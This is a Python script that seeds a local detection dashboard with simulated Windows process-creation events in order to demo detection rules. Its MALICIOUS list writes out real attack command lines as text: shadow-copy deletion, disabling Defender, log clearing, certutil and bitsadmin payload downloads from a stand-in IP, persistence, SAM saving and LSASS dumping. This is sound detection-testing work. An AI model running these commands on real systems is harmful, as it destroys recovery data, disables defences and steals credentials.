"""Seed synthetic 4688 (process creation) events for demoing the v2 detection rules.

Nothing is executed on this machine: the command lines are just text posted to
the API, tagged source="simulated" on host SIM-WS01 so they are easy to spot and
remove. Does not need an elevated terminal.

    python scripts/seed_simulated_events.py          # post ~25 events
    python scripts/seed_simulated_events.py --wipe   # delete all simulated events
"""

import argparse
import json
import random
import sys
import uuid
from datetime import datetime, timedelta, timezone
from pathlib import Path

import httpx
from dotenv import dotenv_values

BACKEND_DIR = Path(__file__).resolve().parent.parent / "backend"
API_BASE_URL = "http://127.0.0.1:8000"
HOST = "SIM-WS01"
USER = "SIM-WS01\\jdoe"

# (process, command line) - one or more per v2 rule.
MALICIOUS = [
    ("C:\\Windows\\System32\\vssadmin.exe", "vssadmin.exe delete shadows /all /quiet"),
    ("C:\\Windows\\System32\\wbem\\WMIC.exe", "wmic shadowcopy delete"),
    ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true"),
    ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe Add-MpPreference -ExclusionPath C:\\Users\\Public"),
    ("C:\\Windows\\System32\\wevtutil.exe", "wevtutil cl Security"),
    ("C:\\Windows\\System32\\certutil.exe", "certutil.exe -urlcache -split -f http://203.0.113.10/payload.exe C:\\Users\\Public\\payload.exe"),
    ("C:\\Windows\\System32\\bitsadmin.exe", "bitsadmin /transfer job1 http://203.0.113.10/tool.exe C:\\Users\\Public\\tool.exe"),
    ("C:\\Windows\\System32\\sc.exe", 'sc.exe create updsvc binPath= "C:\\Users\\Public\\payload.exe" start= auto'),
    ("C:\\Windows\\System32\\reg.exe", 'reg add "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'),
    ("C:\\Windows\\System32\\reg.exe", 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d "C:\\Users\\Public\\payload.exe" /f'),
    ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File C:\\Users\\Public\\run.ps1"),
    ("C:\\Windows\\System32\\reg.exe", "reg save HKLM\\SAM C:\\Users\\Public\\sam.save"),
    ("C:\\Windows\\System32\\rundll32.exe", "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 672 C:\\Users\\Public\\lsass.dmp full"),
]

BENIGN = [
    ("C:\\Windows\\System32\\notepad.exe", "notepad.exe C:\\Users\\jdoe\\Documents\\notes.txt"),
    ("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=renderer'),
    ("C:\\Windows\\explorer.exe", "C:\\Windows\\explorer.exe"),
    ("C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\System32\\svchost.exe -k netsvcs -p"),
    ("C:\\Windows\\System32\\taskhostw.exe", "taskhostw.exe"),
    ("C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", '"WINWORD.EXE" /n "C:\\Users\\jdoe\\Documents\\report.docx"'),
    ("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -NoProfile -Command Get-ChildItem C:\\Users\\jdoe"),
    ("C:\\Windows\\System32\\cmd.exe", "cmd.exe /c dir C:\\Users\\jdoe\\Downloads"),
    ("C:\\Windows\\System32\\SearchProtocolHost.exe", "SearchProtocolHost.exe Global\\UsGthrFltPipeMssGthrPipe1"),
    ("C:\\Program Files\\Git\\cmd\\git.exe", "git.exe status"),
    ("C:\\Windows\\System32\\RuntimeBroker.exe", "C:\\Windows\\System32\\RuntimeBroker.exe -Embedding"),
    ("C:\\Windows\\System32\\reg.exe", "reg query HKCU\\Software\\Microsoft\\Office"),
]


def _build_events() -> list[dict]:
    now = datetime.now(timezone.utc)
    events = []
    for process, command_line in MALICIOUS + BENIGN:
        timestamp = now - timedelta(seconds=random.randint(0, 20 * 60))
        fields = {
            "process": process,
            "command_line": command_line,
            "parent_process": "C:\\Windows\\explorer.exe",
            "user": USER,
        }
        events.append({
            "id": str(uuid.uuid4()),
            "record_id": None,
            "source": "simulated",
            "host": HOST,
            "timestamp": timestamp.isoformat(),
            "channel": "Security",
            "provider": "Microsoft-Windows-Security-Auditing",
            "event_id": 4688,
            **fields,
            "src_ip": None,
            "logon_type": None,
            "message": "A new process has been created. (simulated)",
            "raw": json.dumps({"simulated": True, **fields}),
        })
    return events


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--wipe", action="store_true", help="delete all simulated events instead of seeding")
    args = parser.parse_args()

    collector_key = dotenv_values(BACKEND_DIR / ".env").get("COLLECTOR_API_KEY")
    if not collector_key:
        print("COLLECTOR_API_KEY not found in backend/.env. Aborting.")
        return 1
    headers = {"X-Collector-Key": collector_key}

    with httpx.Client(base_url=API_BASE_URL, headers=headers, timeout=30) as client:
        if args.wipe:
            resp = client.delete("/api/events/simulated")
        else:
            resp = client.post("/api/events/ingest", json={"events": _build_events()})

    if resp.status_code >= 400:
        print(f"[error] API returned status {resp.status_code}")
        return 1
    print(f"Done: {resp.json()}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
